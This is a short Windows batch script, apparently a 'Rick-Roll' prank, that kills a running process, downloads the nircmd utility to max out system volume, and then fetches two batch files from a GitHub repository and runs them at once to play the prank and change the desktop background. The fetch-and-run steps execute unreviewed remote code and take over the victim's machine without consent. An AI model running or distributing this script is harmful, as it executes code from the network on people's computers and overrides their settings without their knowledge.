taskkill /F /IM "wallpaper32.exe" /T
C:\Windows\System32\rundll32.exe C:\Windows\System32\user32.dll, UpdatePerUserSystemParameters 1, True

curl https://www.nirsoft.net/utils/nircmd-x64.zip -O
powershell Expand-Archive -Force nircmd-x64.zip C:\Users\%username%\Downloads\

C:\Users\%username%\Downloads\nircmd.exe setsysvolume 65535


curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/RickStart.bat -O RickStart.bat
start RickStart.bat

C:\Windows\System32\rundll32.exe C:\Windows\System32\user32.dll, UpdatePerUserSystemParameters 1, True
curl https://raw.githubusercontent.com/WalaBalla/Rick-Roll-test/main/BackgroundChanger.bat -O 
start BackgroundChanger.bat


